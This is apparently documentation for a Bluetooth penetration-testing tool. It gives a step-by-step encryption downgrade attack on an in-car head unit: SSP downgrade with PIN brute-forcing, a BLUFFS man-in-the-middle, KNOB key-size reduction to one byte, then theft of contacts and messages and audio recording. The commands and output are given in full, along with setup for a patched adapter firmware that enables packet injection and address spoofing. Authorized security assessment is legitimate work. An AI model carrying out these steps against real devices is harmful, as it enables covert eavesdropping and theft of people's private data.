# Encryption Downgrade Workflow

## Scenario

You've identified a Bluetooth target that advertises services requiring authentication -- phonebook (PBAP), messages (MAP), audio (HFP/A2DP). To access these, you need a pairing. But you don't have one, and the target owner isn't going to accept your pairing request.

This workflow walks through the full encryption downgrade attack chain: probing SSP enforcement, downgrading to legacy PIN pairing, brute-forcing the PIN, exploiting BLUFFS to weaken session keys, and using KNOB to reduce encryption key size. Each step builds on the previous one, and by the end, you either have a valid pairing or have broken the encryption to the point where traffic is trivially decryptable.

The narrative follows an attack against an automotive IVI head unit at `AA:BB:CC:DD:EE:FF`, with a paired phone at `11:22:33:44:55:66`.

**Time estimate:** 10-30 minutes depending on attack vector
**Risk level:** High (active exploitation, modifies pairing state)

!!! note "Prerequisites"
    - **Root access** on your assessment machine
    - **Bluetooth adapter** (hci0) -- any USB dongle for Steps 1-2
    - **DarkFirmware-patched RTL8761B** (e.g., TP-Link UB500) for Steps 3-4. See [DarkFirmware Setup](#darkfirmware-setup) at the bottom of this page.
    - **Target in range** (~10 meters)
    - Steps 1-2 work against **any adapter**. Steps 3-4 require **firmware-level LMP injection** that only DarkFirmware provides.

---

## Attack Overview

The encryption downgrade chain has multiple paths depending on what the target supports:

```
1. Probe SSP capabilities
        |
    SSP enforced? ──── No ──── 2. Downgrade to PIN + brute-force
        |                              |
       Yes                         Pairing established
        |                              |
3. BLUFFS session key derivation       |
   (requires DarkFirmware)             |
        |                              |
4. Encryption key size downgrade       |
   (requires DarkFirmware)             |
        |                              |
5. Extract data over weakened/broken encryption
```

The goal is always the same: get from "no access" to "authenticated connection with exploitable encryption."

---

## Step 1: Probe SSP Support

First, determine whether the target enforces Secure Simple Pairing. This tells you which attack path is available:

```bash
$ sudo blue-tap exploit AA:BB:CC:DD:EE:FF ssp-downgrade --method probe
[*] Probing SSP capabilities on AA:BB:CC:DD:EE:FF (IVI-Headunit)...
[*] Sending LMP feature request...

  Property                  | Value
 ---------------------------|--------------------------------------
  SSP Supported             | Yes
  SSP Enforced              | No  <<<
  IO Capability             | DisplayYesNo
  MITM Protection           | Not required
  Secure Connections        | Supported but not required
  Legacy Pairing Accepted   | Yes <<<
  Min Encryption Key Size   | 1 byte <<<

[+] Probe complete.
[!] Target accepts legacy PIN pairing (SSP not enforced).
[!] Target accepts 1-byte encryption keys (KNOB vulnerable).
```

**What happened:** Blue-Tap sent an LMP feature request and analyzed the target's capability response. The critical findings:

- **SSP Not Enforced:** The target *supports* SSP but doesn't *require* it. If an attacker claims to be a legacy device, the target will fall back to PIN pairing.
- **Legacy Pairing Accepted:** Confirms the fallback path is open.
- **Min Encryption Key Size: 1 byte:** The target doesn't enforce a minimum key size, making it vulnerable to KNOB.

**Decision point:**

| Finding | Meaning | Next step |
|---------|---------|-----------|
| SSP not enforced | Target accepts legacy PIN pairing | **Step 2** -- downgrade and brute-force |
| SSP enforced, no MITM | Numeric comparison only, no MITM protection | **Step 3** -- BLUFFS |
| SSP enforced, MITM required | Strong pairing, harder to attack | **Step 3** or **Step 4** |
| Secure Connections required | SC-only mode, legacy attacks blocked | **Step 3** (BLUFFS still applies to SC) |

---

## Step 2: SSP Downgrade + PIN Brute-Force

Force the target to fall back to legacy PIN pairing, then brute-force the PIN:

```bash
$ sudo blue-tap exploit AA:BB:CC:DD:EE:FF ssp-downgrade \
    --method downgrade_and_brute \
    --pin-start 0 \
    --pin-end 9999
[*] Attempting SSP downgrade on AA:BB:CC:DD:EE:FF...
[*] Step 1/3: Advertising as legacy-only device (no SSP capability in features)
[*] Step 2/3: Initiating pairing request...
[+] Target accepted legacy PIN authentication!
[*] Step 3/3: Brute-forcing PIN 0000-9999...
[*] Trying PIN: 0000
[+] PIN FOUND: 0000 (attempt 1/10000, elapsed 0.3s)
[+] Link key derived: 4A:8F:2C:91:B3:E7:5D:0A:CC:12:FE:88:34:67:A1:9D
[+] Pairing stored in local database.

Outcome: success
PIN: 0000
Link key: 4A8F2C91B3E75D0ACC12FE883467A19D
Duration: 3.2s
```

**What happened:** Three things occurred in sequence:

1. **Feature masking:** Blue-Tap advertised itself as a Bluetooth 2.0 device without SSP support. The target saw a "legacy" device and switched to the old PIN-based pairing.
2. **Pairing initiation:** The target accepted the pairing request under legacy mode.
3. **PIN brute-force:** Blue-Tap tried PINs starting from 0000. The IVI uses the default PIN `0000`, so it was found on the first attempt.

**Decision point:**

- **If PIN found quickly (0000, 1234)** -- most automotive and consumer devices use default PINs. You're in.
- **If brute-force is slow (rate-limited)** -- some devices add delays between attempts. Blue-Tap handles cooldowns automatically. Full 4-digit space takes under 2 minutes at normal rate, up to 10 minutes with aggressive rate limiting.
- **If target rejects legacy pairing entirely** -- SSP is strictly enforced. Skip to Step 3 (BLUFFS).

!!! tip
    Most car head units and older devices use fixed PINs like `0000` or `1234`. The brute-force usually succeeds in under 2 minutes for 4-digit PINs (10,000 combinations).

!!! warning
    Failed PIN attempts may trigger rate limiting or lockout on some devices. Blue-Tap automatically handles cooldowns between attempts.

---

## Step 3: BLUFFS Attack (Session Key Derivation)

If SSP is enforced (or you want to attack an *existing* connection between two devices), BLUFFS (CVE-2023-24023) lets you force weak session keys. This is an active MITM attack that positions you between the target and its paired phone.

```bash
$ sudo blue-tap exploit AA:BB:CC:DD:EE:FF bluffs \
    --variant a3 \
    --phone 11:22:33:44:55:66
[*] Loading DarkFirmware LMP injection module on hci0...
[+] DarkFirmware active. LMP manipulation enabled.
[*] BLUFFS variant A3: MITM between IVI-Headunit and Galaxy S24
[*] Phase 1/4: Spoofing IVI address toward phone...
[+] Phone sees us as AA:BB:CC:DD:EE:FF
[*] Phase 2/4: Spoofing phone address toward IVI...
[+] IVI sees us as 11:22:33:44:55:66
[*] Phase 3/4: Intercepting LMP session key negotiation...
[*] Injecting modified LMP_comb_key with reduced entropy...
[+] Both devices accepted modified session key parameters
[*] Phase 4/4: Deriving session key...
[+] Session key negotiated with reduced entropy.

Outcome: success
Session key:    0x7A3F0100000000000000000000000000
Effective bits: 24 (from 128)
Key material:   7A:3F:01 (padded to 16 bytes with zeros)
MITM position:  Active, relaying traffic
```

**What happened:** DarkFirmware gave Blue-Tap the ability to inject modified LMP (Link Manager Protocol) packets below the HCI layer. The attack worked in four phases:

1. **Spoofed the IVI's address** toward the phone, so the phone thinks it's talking to the IVI
2. **Spoofed the phone's address** toward the IVI, so the IVI thinks it's talking to the phone
3. **Intercepted the LMP session key negotiation** and modified the entropy parameters
4. **Derived the weakened session key** -- only 24 bits of effective entropy instead of 128

With 24-bit entropy, the session key can be brute-forced in seconds, and all encrypted traffic between the two devices can be decrypted.

**BLUFFS variants:**

| Variant | Attack | Requirement |
|---------|--------|-------------|
| `a1` | Downgrade session key entropy during pairing | Attacker impersonates peripheral |
| `a2` | Downgrade session key entropy during resumption | Attacker impersonates central |
| `a3` | Force both roles to derive weak session key | MITM position between two devices |
| `a4` | Session key derivation with role switch | Active role manipulation |

The `--phone` flag specifies the second device MAC when performing MITM (variant `a3`). The attacker sits between `TARGET` and `PHONE`, relaying and modifying traffic.

!!! danger
    BLUFFS requires active MITM positioning. This **disrupts the existing connection** between the two target devices. They will experience a brief disconnection during the attack setup.

**Decision point:**

- **If session key has reduced entropy** -- the attack worked. You can now decrypt traffic or proceed to Step 5 for data extraction.
- **If the target rejects modified LMP parameters** -- it may be patched for CVE-2023-24023. Note "not vulnerable to BLUFFS" in your report. Try Step 4 (KNOB) independently.

---

## Step 4: Encryption Key Size Downgrade (KNOB)

Force the target to accept a minimal encryption key size. This is independent of pairing -- it attacks the encryption setup after pairing is already established:

```bash
$ sudo blue-tap exploit AA:BB:CC:DD:EE:FF enc-downgrade --method all
[*] Loading DarkFirmware LMP injection module on hci0...
[+] DarkFirmware active.
[*] Testing encryption key size downgrade methods...

  Method 1/2: KNOB (CVE-2019-9506)
  [*] Initiating encrypted connection...
  [*] Intercepting LMP_encryption_key_size_req...
  [*] Modifying proposed key size: 16 --> 1 byte
  [+] Target accepted 1-byte encryption key!

  Negotiated key size: 1 byte
  Effective security:  8 bits (256 possible keys)
  Brute-force time:    <1 second

  Method 2/2: LMP manipulation (direct)
  [*] Sending modified LMP_setup_complete with key_size=1...
  [+] Confirmed: key size locked at 1 byte.

Outcome: success
Methods successful: knob, lmp_manipulation
Final key size: 1 byte
```

**What happened:** DarkFirmware intercepted the LMP encryption key size negotiation and modified it to propose a 1-byte key. The target accepted, reducing the effective encryption from 128 bits to 8 bits. With only 256 possible keys, brute-forcing the encryption is instantaneous.

**Methods:**

| Method | Attack | Based on |
|--------|--------|----------|
| `knob` | Negotiate minimum key size (1 byte) via standard LMP | CVE-2019-9506 |
| `lmp_manipulation` | Directly modify LMP encryption setup messages | LMP injection |
| `all` | Try all methods sequentially | -- |

**Decision point:**

- **If key size reduced to 1-7 bytes** -- the encryption is trivially breakable. Proceed to Step 5.
- **If key size stays at 16 bytes** -- the target enforces a minimum key size (KNOB mitigation is in place). Note this in your report as a positive finding.

---

## Step 5: Post-Exploitation over Weakened Encryption

You now have either a valid pairing (from Step 2) or broken encryption (from Steps 3-4). Extract data to prove impact:

```bash
$ sudo blue-tap extract AA:BB:CC:DD:EE:FF contacts --all
[*] Connecting to PBAP server on AA:BB:CC:DD:EE:FF...
[*] Encryption: active (key size: 1 byte -- effectively cleartext)
[+] 847 contacts extracted.
[+] Saved to: sessions/enc-downgrade-20260416/contacts/
```

```bash
$ sudo blue-tap extract AA:BB:CC:DD:EE:FF messages
[*] Connecting to MAP server on AA:BB:CC:DD:EE:FF...
[+] 234 messages extracted.
[+] Saved to: sessions/enc-downgrade-20260416/messages/
```

```bash
$ sudo blue-tap extract AA:BB:CC:DD:EE:FF audio --action record -d 60
[*] Establishing HFP SCO connection...
[*] Encryption: active (key size: 1 byte)
[+] 60s recording saved (1.88 MB)
```

**What happened:** With the encryption downgraded, all authenticated services are accessible. The data is transmitted over what appears to be an encrypted link, but with a 1-byte key, the encryption provides zero meaningful protection.

See [Audio Eavesdropping Workflow](audio-eavesdropping.md) for the full audio attack chain.

---

## Evidence Summary

Document these findings for your report:

| Evidence | Where to find it | Significance |
|----------|------------------|-------------|
| SSP enforcement status | Step 1 probe output | Shows whether legacy pairing is possible |
| Discovered PIN | Step 2 output | Proves 4-digit PIN space is brute-forceable |
| BLUFFS session key | Step 3 output (hex) | Shows encryption entropy reduced from 128 to 24 bits |
| Negotiated key size | Step 4 output | Shows KNOB reduced key to 1 byte (8 bits) |
| Extracted contacts/messages | Session artifacts directory | Proves data compromise through weakened encryption |
| Audio recording | Session artifacts directory | Proves eavesdropping capability |

---

## DarkFirmware Setup

Steps 3 and 4 require a DarkFirmware-patched RTL8761B adapter (e.g., TP-Link UB500, ~$12 USD):

```bash
# 1. Confirm adapter is RTL8761B
$ sudo blue-tap adapter info
[*] Adapter: hci0
    Chipset:  Realtek RTL8761BUV
    USB ID:   2357:0604
    Firmware: rtl8761bu_fw (stock)
    Status:   UP RUNNING

# 2. Load DarkFirmware patch
$ sudo blue-tap firmware load --patch darkfirmware
[*] Loading DarkFirmware patch for RTL8761B...
[*] Stopping hci0...
[*] Uploading patched firmware (128 KB)...
[*] Restarting hci0...
[+] DarkFirmware loaded successfully.

# 3. Verify patch is active
$ sudo blue-tap firmware status
[*] Adapter: hci0
    Chipset:  Realtek RTL8761BUV
    Firmware: DarkFirmware v1.2.0
    Capabilities:
      - LMP packet injection      [active]
      - LMP packet interception    [active]
      - Address spoofing           [active]
      - Key size manipulation      [active]
    Status:   UP RUNNING PATCHED
```

**What happened:** DarkFirmware replaces the stock RTL8761B firmware with a patched version that exposes LMP-level packet injection and interception through vendor-specific HCI commands. This gives Blue-Tap access to the Link Manager Protocol layer, which is normally hidden behind the controller.

!!! warning
    DarkFirmware modifies the adapter's firmware in RAM. The adapter resets to stock firmware when unplugged or on system reboot. No permanent changes are made to the hardware.

---

## Troubleshooting

| Problem | Cause | Fix |
|---------|-------|-----|
| SSP downgrade rejected | Target strictly enforces SSP | Skip to BLUFFS (Step 3) |
| PIN brute-force timeout | Target has rate limiting | Increase `--cooldown` between attempts; be patient |
| PIN brute-force exhausted | PIN is longer than 4 digits | Try `--pin-end 999999` for 6-digit range (takes longer) |
| BLUFFS fails to negotiate | Target patched for CVE-2023-24023 | Note "not vulnerable" in report; try KNOB independently |
| Key size stays at 16 | Target enforces minimum key size | Note KNOB mitigation is in place; this is a positive finding |
| DarkFirmware not loading | Wrong adapter chipset | Verify RTL8761B with `lsusb | grep -i realtek` |
| DarkFirmware loaded but LMP fails | Firmware version mismatch | Check `sudo blue-tap firmware status` for capability list |
| Target disconnects during BLUFFS | MITM setup disrupted existing link | Expected -- reconnection happens automatically |

---

## Summary

The encryption downgrade chain demonstrated:

1. **SSP is not enforced** -- the target accepts legacy PIN pairing despite supporting SSP
2. **Default PIN accepted** -- PIN 0000 on first attempt, 3 seconds total
3. **BLUFFS reduces session key entropy** -- from 128 bits to 24 bits via LMP manipulation
4. **KNOB reduces key size** -- from 16 bytes to 1 byte, making encryption trivially breakable
5. **Full data extraction** -- contacts, messages, and audio over the compromised connection

The core message for clients: Bluetooth encryption is only as strong as its negotiation. If the device doesn't enforce SSP, minimum key sizes, and session key entropy, the entire encryption layer can be systematically dismantled.

---

## What's Next?

- [Audio Eavesdropping Workflow](audio-eavesdropping.md) -- full audio attack chain once you have a pairing
- [Full Penetration Test](full-pentest.md) -- integrate encryption downgrade into a complete assessment
- [Quick Assessment](quick-assessment.md) -- triage a target before investing in exploitation
- [Custom Playbooks](custom-playbooks.md) -- automate the downgrade chain for repeatable testing
